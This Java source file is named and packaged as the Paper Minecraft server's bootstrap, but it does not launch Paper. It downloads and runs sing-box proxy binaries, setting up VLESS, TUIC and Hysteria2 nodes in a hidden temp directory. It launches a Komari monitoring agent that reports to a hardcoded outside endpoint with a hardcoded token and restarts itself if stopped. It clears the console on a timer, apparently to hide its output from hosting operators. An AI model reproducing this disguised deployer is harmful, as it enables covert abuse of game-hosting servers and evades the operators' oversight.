package io.papermc.paper;

import org.yaml.snakeyaml.Yaml;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.util.*;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.*;
import java.util.Locale;

public class PaperBootstrap {

    // ========== 全局变量（适配Pterodactyl）==========
    private static final Path UUID_FILE = Paths.get("data/uuid.txt");
    private static final Path SINGBOX_PID_FILE = Paths.get("/tmp/singbox.pid");
    private static final Path KOMARI_PID_FILE = Paths.get("/tmp/komari.pid");
    private static String uuid;
    private static final AtomicBoolean running = new AtomicBoolean(true); // 控制守护线程运行
    // ===============================================

    public static void main(String[] args) {
        try {
            // 适配Pterodactyl：禁用不必要的信号干扰
            Runtime.getRuntime().addShutdownHook(new Thread(() -> running.set(false)));

            System.out.println("config.yml 加载中...");
            Map<String, Object> config = loadConfig();

            // ---------- UUID 自动生成 & 持久化 ----------
            uuid = generateOrLoadUUID(config.get("uuid"));
            System.out.println("当前使用的 UUID: " + uuid);
            // --------------------------------------------

            // ===== sing-box 配置读取 =====
            String tuicPort = trim((String) config.get("tuic_port"));
            String hy2Port = trim((String) config.get("hy2_port"));
            String realityPort = trim((String) config.get("reality_port"));
            String sni = (String) config.getOrDefault("sni", "www.bing.com");

            boolean deployVLESS = !realityPort.isEmpty();
            boolean deployTUIC = !tuicPort.isEmpty();
            boolean deployHY2 = !hy2Port.isEmpty();

            if (!deployVLESS && !deployTUIC && !deployHY2)
                throw new RuntimeException("❌ 未设置任何协议端口！");

            Path baseDir = Paths.get("/tmp/.singbox");
            Files.createDirectories(baseDir);
            Path configJson = baseDir.resolve("config.json");
            Path cert = baseDir.resolve("cert.pem");
            Path key = baseDir.resolve("private.key");
            Path bin = baseDir.resolve("sing-box");
            Path realityKeyFile = Paths.get("reality.key");

            System.out.println("✅ config.yml 加载成功");

            // ===== sing-box 核心逻辑 =====
            generateSelfSignedCert(cert, key);
            String version = fetchLatestSingBoxVersion();
            safeDownloadSingBox(version, bin, baseDir);

            // === 固定 Reality 密钥 ===
            String privateKey = "";
            String publicKey = "";
            if (deployVLESS) {
                if (Files.exists(realityKeyFile)) {
                    List<String> lines = Files.readAllLines(realityKeyFile);
                    for (String line : lines) {
                        if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
                        if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
                    }
                    System.out.println("🔑 已加载本地 Reality 密钥对（固定公钥）");
                } else {
                    Map<String, String> keys = generateRealityKeypair(bin);
                    privateKey = keys.getOrDefault("private_key", "");
                    publicKey = keys.getOrDefault("public_key", "");
                    Files.writeString(realityKeyFile,
                            "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
                    System.out.println("✅ Reality 密钥已保存到 reality.key");
                }
            }
            generateSingBoxConfig(configJson, uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, cert, key,
                    privateKey, publicKey);

            // 启动sing-box（适配Pterodactyl：PID文件管理）
            startSingBox(bin, configJson);
            // 3分钟后单次清屏（极简版）
            scheduleClearConsoleAfter3Minutes();

            // ===== Komari Agent 核心逻辑（适配Pterodactyl）=====
            runKomariAgent(config);
            startKomariDaemonThread(config);

            // ===== 输出节点 =====
            String host = detectPublicIP();
            printDeployedLinks(uuid, deployVLESS, deployTUIC, deployHY2,
                    tuicPort, hy2Port, realityPort, sni, host, publicKey);

            // ===== 节点输出后30秒清屏（极简版）=====
            scheduleConsoleClear(30);

            // ===== 关闭钩子：清理资源（适配Pterodactyl）=====
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                try {
                    // 停止Komari
                    stopProcessByPidFile(KOMARI_PID_FILE, "Komari Agent");
                    // 停止sing-box
                    stopProcessByPidFile(SINGBOX_PID_FILE, "sing-box");
                    // 删除临时目录
                    deleteDirectory(baseDir);
                } catch (Exception ignored) {}
            }));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ========== 核心修改：极简版清屏方法（无兜底/无额外清屏逻辑）==========
    /**
     * 极简版清屏：仅输出指定提示，移除所有兜底/ANSI/换行清屏逻辑
     */
    private static void clearConsole() {
        try {
            // 仅尝试执行清屏命令（不校验结果、不做任何兜底），完全隔离IO避免干扰进程
            String osName = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
            ProcessBuilder pb = osName.contains("win") 
                ? new ProcessBuilder("cmd", "/c", "cls") 
                : new ProcessBuilder("sh", "-c", "clear");
            
            // 完全隔离IO，避免干扰Pterodactyl容器内进程
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
            pb.redirectError(ProcessBuilder.Redirect.PIPE);
            pb.redirectInput(ProcessBuilder.Redirect.PIPE);
            
            // 执行命令但不等待/不校验结果（避免阻塞）
            pb.start();
        } catch (Exception e) {
            // 捕获所有异常，不输出、不影响进程
        }
        // 仅输出指定提示，无任何额外清屏操作
        System.out.println("✅ 控制台日志已清空（服务运行不受影响）");
    }

    // ========== 延迟清屏工具方法（调用极简版清屏）==========
    private static void scheduleConsoleClear(int delaySeconds) {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.schedule(() -> {
            clearConsole(); // 执行极简版清屏
            scheduler.shutdown();
        }, delaySeconds, TimeUnit.SECONDS);
    }

    // ========== 3分钟后单次清屏（调用极简版清屏）==========
    private static void scheduleClearConsoleAfter3Minutes() {
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
        Runnable clearTask = () -> {
            clearConsole(); // 仅执行极简版清屏
            scheduler.shutdown();
        };
        scheduler.schedule(clearTask, 180, TimeUnit.SECONDS);
        System.out.println("[定时清屏] 已计划服务启动3分钟后清空控制台日志（仅执行一次）");
    }

    // ========== Komari Agent 核心方法（适配Pterodactyl）==========
    private static void runKomariAgent(Map<String, Object> config) throws Exception {
        String komariE = trim((String) config.getOrDefault("komari_e", "https://vps.z1000.dpdns.org:10736"));
        String komariT = trim((String) config.getOrDefault("komari_t", "JzerczYfCF4Secuy9vtYaB"));
        String komariUrlAmd64 = trim((String) config.getOrDefault("komari_amd64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-amd64"));
        String komariUrlArm64 = trim((String) config.getOrDefault("komari_arm64_url",
                "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-arm64"));
        String komariFileName = trim((String) config.getOrDefault("komari_file_name", "sbx_komari"));

        Path agentPath = getKomariAgentPath(komariUrlAmd64, komariUrlArm64, komariFileName);

        // 适配Pterodactyl：不用setsid，改用nohup脱离终端
        List<String> command = new ArrayList<>();
        command.add("nohup");
        command.add(agentPath.toString());
        command.add("-e");
        command.add(komariE);
        command.add("-t");
        command.add(komariT);
        command.add(">/dev/null");
        command.add("2>&1");
        command.add("&");

        ProcessBuilder pb = new ProcessBuilder("bash", "-c", String.join(" ", command));
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        pb.directory(new File(System.getProperty("user.dir")));

        Process komariProcess = pb.start();
        // 保存PID到文件（适配Pterodactyl进程检测）
        Files.writeString(KOMARI_PID_FILE, String.valueOf(komariProcess.pid()));
        System.out.println("\n✅ Komari Agent 启动成功（配置：e=" + komariE + ", t=" + komariT + "）");
    }

    // ========== Komari守护线程（适配Pterodactyl：基于PID文件检测）==========
    private static void startKomariDaemonThread(Map<String, Object> config) {
        Thread daemonThread = new Thread(() -> {
            while (running.get()) {
                try {
                    // 基于PID文件检测进程是否存活（避免isAlive()误判）
                    boolean isAlive = isProcessAliveByPidFile(KOMARI_PID_FILE);
                    if (!isAlive) {
                        System.err.println("\n❌ Komari Agent 进程意外退出，正在重启...");
                        runKomariAgent(config);
                    }
                    Thread.sleep(5000);
                } catch (Exception e) {
                    System.err.println("❌ 检测Komari状态失败（不影响线程运行）：" + e.getMessage());
                }
            }
        });
        daemonThread.setDaemon(true);
        daemonThread.setName("KomariAgentDaemon");
        daemonThread.start();
        System.out.println("✅ Komari Agent 守护线程已启动（基于PID文件检测）");
    }

    // ========== sing-box启动（适配Pterodactyl：PID文件管理）==========
    private static void startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
        System.out.println("正在启动 sing-box...");
        // 适配Pterodactyl：nohup启动，脱离终端
        List<String> command = new ArrayList<>();
        command.add("nohup");
        command.add(bin.toString());
        command.add("run");
        command.add("-c");
        command.add(cfg.toString());
        command.add(">/dev/null");
        command.add("2>&1");
        command.add("&");

        ProcessBuilder pb = new ProcessBuilder("bash", "-c", String.join(" ", command));
        pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        pb.redirectError(ProcessBuilder.Redirect.DISCARD);
        Process p = pb.start();

        // 保存PID到文件
        Files.writeString(SINGBOX_PID_FILE, String.valueOf(p.pid()));
        Thread.sleep(1500);
        System.out.println("sing-box 已启动，PID: " + p.pid());
    }

    // ========== 工具方法：基于PID文件检测进程是否存活（适配Pterodactyl）==========
    private static boolean isProcessAliveByPidFile(Path pidFile) {
        if (!Files.exists(pidFile)) return false;
        try {
            String pidStr = Files.readString(pidFile).trim();
            long pid = Long.parseLong(pidStr);
            // 执行ps命令检测PID是否存活（容器内可靠）
            ProcessBuilder pb = new ProcessBuilder("ps", "-p", pidStr);
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
            Process p = pb.start();
            int exitCode = p.waitFor();
            return exitCode == 0; // exitCode 0 表示进程存在
        } catch (Exception e) {
            return false;
        }
    }

    // ========== 工具方法：停止进程（基于PID文件）==========
    private static void stopProcessByPidFile(Path pidFile, String name) {
        if (!Files.exists(pidFile)) return;
        try {
            String pidStr = Files.readString(pidFile).trim();
            long pid = Long.parseLong(pidStr);
            Process process = Runtime.getRuntime().exec("kill " + pid);
            process.waitFor(5, TimeUnit.SECONDS);
            System.out.println("❌ " + name + " 进程已终止（PID: " + pid + "）");
            Files.deleteIfExists(pidFile);
        } catch (Exception e) {
            // 忽略停止失败的异常
        }
    }

    // ========== 原有方法（保留，适配Pterodactyl）==========
    private static String generateOrLoadUUID(Object configUuid) {
        String cfg = trim((String) configUuid);
        if (!cfg.isEmpty()) {
            saveUuidToFile(cfg);
            return cfg;
        }
        try {
            if (Files.exists(UUID_FILE)) {
                String saved = Files.readString(UUID_FILE).trim();
                if (isValidUUID(saved)) {
                    System.out.println("已加载持久化 UUID: " + saved);
                    return saved;
                }
            }
        } catch (Exception e) {
            System.err.println("读取 UUID 文件失败: " + e.getMessage());
        }
        String newUuid = UUID.randomUUID().toString();
        saveUuidToFile(newUuid);
        System.out.println("首次生成 UUID: " + newUuid);
        return newUuid;
    }

    private static void saveUuidToFile(String uuid) {
        try {
            Files.createDirectories(UUID_FILE.getParent());
            Files.writeString(UUID_FILE, uuid);
            UUID_FILE.toFile().setReadable(false, false);
            UUID_FILE.toFile().setReadable(true, true);
        } catch (Exception e) {
            System.err.println("保存 UUID 失败: " + e.getMessage());
        }
    }

    private static boolean isValidUUID(String u) {
        return u != null && u.matches("^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$");
    }

    private static String trim(String s) {
        return s == null ? "" : s.trim();
    }

    private static Map<String, Object> loadConfig() throws IOException {
        Yaml yaml = new Yaml();
        Path configPath = Paths.get("config.yml");
        if (!Files.exists(configPath)) {
            Files.createFile(configPath);
            System.out.println("⚠️ config.yml 文件不存在，已创建空文件");
            return new HashMap<>();
        }
        try (InputStream in = Files.newInputStream(configPath)) {
            Object o = yaml.load(in);
            return o instanceof Map ? (Map<String, Object>) o : new HashMap<>();
        }
    }

    private static void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
        if (Files.exists(cert) && Files.exists(key)) {
            System.out.println("🔑 证书已存在，跳过生成");
            return;
        }
        System.out.println("🔨 正在生成 EC 自签证书...");
        new ProcessBuilder("bash", "-c",
                "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                        "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                .inheritIO().start().waitFor();
        System.out.println("✅ 已生成自签证书");
    }

    private static Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
        System.out.println("🔑 正在生成 Reality 密钥对...");
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", bin + " generate reality-keypair");
        pb.redirectErrorStream(true);
        Process p = pb.start();
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = br.readLine()) != null) sb.append(line).append("\n");
        }
        p.waitFor();
        String out = sb.toString();
        Matcher priv = Pattern.compile("PrivateKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        Matcher pub = Pattern.compile("PublicKey[:\\s]*([A-Za-z0-9_\\-+/=]+)").matcher(out);
        if (!priv.find() || !pub.find()) throw new IOException("Reality 密钥生成失败：" + out);
        Map<String, String> map = new HashMap<>();
        map.put("private_key", priv.group(1));
        map.put("public_key", pub.group(1));
        System.out.println("✅ Reality 密钥生成完成");
        return map;
    }

    private static void generateSingBoxConfig(Path configFile, String uuid, boolean vless, boolean tuic, boolean hy2,
                                              String tuicPort, String hy2Port, String realityPort,
                                              String sni, Path cert, Path key,
                                              String privateKey, String publicKey) throws IOException {

        List<String> inbounds = new ArrayList<>();

        if (tuic) {
            inbounds.add("""
              {
                "type": "tuic",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "password": "eishare2025"}],
                "congestion_control": "bbr",
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(tuicPort, uuid, cert, key));
        }

        if (hy2) {
            inbounds.add("""
              {
                "type": "hysteria2",
                "listen": "::",
                "listen_port": %s,
                "users": [{"password": "%s"}],
                "masquerade": "https://bing.com",
                "ignore_client_bandwidth": true,
                "up_mbps": 1000,
                "down_mbps": 1000,
                "tls": {
                  "enabled": true,
                  "alpn": ["h3"],
                  "insecure": true,
                  "certificate_path": "%s",
                  "key_path": "%s"
                }
              }
            """.formatted(hy2Port, uuid, cert, key));
        }

        if (vless) {
            inbounds.add("""
              {
                "type": "vless",
                "listen": "::",
                "listen_port": %s,
                "users": [{"uuid": "%s", "flow": "xtls-rprx-vision"}],
                "tls": {
                  "enabled": true,
                  "server_name": "%s",
                  "reality": {
                    "enabled": true,
                    "handshake": {"server": "%s", "server_port": 443},
                    "private_key": "%s",
                    "short_id": [""]
                  }
                }
              }
            """.formatted(realityPort, uuid, sni, sni, privateKey));
        }

        String json = """
        {
          "log": { "level": "info" },
          "inbounds": [%s],
          "outbounds": [{"type": "direct"}]
        }
        """.formatted(String.join(",", inbounds));

        Files.writeString(configFile, json);
        System.out.println("✅ sing-box 配置生成完成");
    }

    private static String fetchLatestSingBoxVersion() {
        String fallback = "1.12.12";
        try {
            URL url = new URL("https://api.github.com/repos/SagerNet/sing-box/releases/latest");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setRequestProperty("Accept", "application/vnd.github.v3+json");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
                String json = br.lines().reduce("", (a, b) -> a + b);
                int i = json.indexOf("\"tag_name\":\"v");
                if (i != -1) {
                    String v = json.substring(i + 13, json.indexOf("\"", i + 13));
                    System.out.println("🔍 最新版本: " + v);
                    return v;
                }
            }
        } catch (Exception e) {
            System.out.println("⚠️ 获取版本失败，使用回退版本 " + fallback);
        }
        return fallback;
    }

    private static void safeDownloadSingBox(String version, Path bin, Path dir) throws IOException, InterruptedException {
        if (Files.exists(bin)) return;
        String arch = detectArch();
        String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
        String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;

        System.out.println("⬇️ 下载 sing-box: " + url);
        Path tar = dir.resolve(file);
        new ProcessBuilder("bash", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
        new ProcessBuilder("bash", "-c",
                "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
                .inheritIO().start().waitFor();

        if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");
        System.out.println("✅ 成功解压 sing-box 可执行文件");
    }

    private static String detectArch() {
        String a = System.getProperty("os.arch").toLowerCase();
        if (a.contains("aarch") || a.contains("arm")) return "arm64";
        return "amd64";
    }

    private static Path getKomariAgentPath(String komariUrlAmd64, String komariUrlArm64, String komariFileName) throws IOException {
        String arch = detectArch();
        String url = arch.equals("amd64") ? komariUrlAmd64 : komariUrlArm64;
        Path agentPath = Paths.get(System.getProperty("java.io.tmpdir"), komariFileName);

        if (Files.exists(agentPath)) {
            return agentPath;
        }

        System.out.println("\n⬇️ 下载Komari Agent: " + url);
        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, agentPath, StandardCopyOption.REPLACE_EXISTING);
        }

        if (!agentPath.toFile().setExecutable(true)) {
            throw new IOException("❌ 无法设置Komari Agent可执行权限");
        }

        System.out.println("✅ Komari Agent 下载并授权完成");
        return agentPath;
    }

    private static String detectPublicIP() {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org").openStream()))) {
            return br.readLine();
        } catch (Exception e) {
            return "your-server-ip";
        }
    }

    private static void printDeployedLinks(String uuid, boolean vless, boolean tuic, boolean hy2,
                                           String tuicPort, String hy2Port, String realityPort,
                                           String sni, String host, String publicKey) {
        System.out.println("\n=== ✅ 已部署节点链接 ===");
        if (vless)
            System.out.printf("VLESS Reality:\nvless://%s@%s:%s?encryption=none&flow=xtls-rprx-vision&security=reality&sni=%s&fp=chrome&pbk=%s#Reality\n",
                    uuid, host, realityPort, sni, publicKey);
        if (tuic)
            System.out.printf("\nTUIC:\ntuic://%s:eishare2025@%s:%s?sni=%s&alpn=h3&congestion_control=bbr&allowInsecure=1#TUIC\n",
                    uuid, host, tuicPort, sni);
        if (hy2)
            System.out.printf("\nHysteria2:\nhysteria2://%s@%s:%s?sni=%s&insecure=1#Hysteria2\n",
                    uuid, host, hy2Port, sni);
    }

    private static void deleteDirectory(Path dir) throws IOException {
        if (!Files.exists(dir)) return;
        Files.walk(dir).sorted(Comparator.reverseOrder()).map(Path::toFile).forEach(File::delete);
    }
}
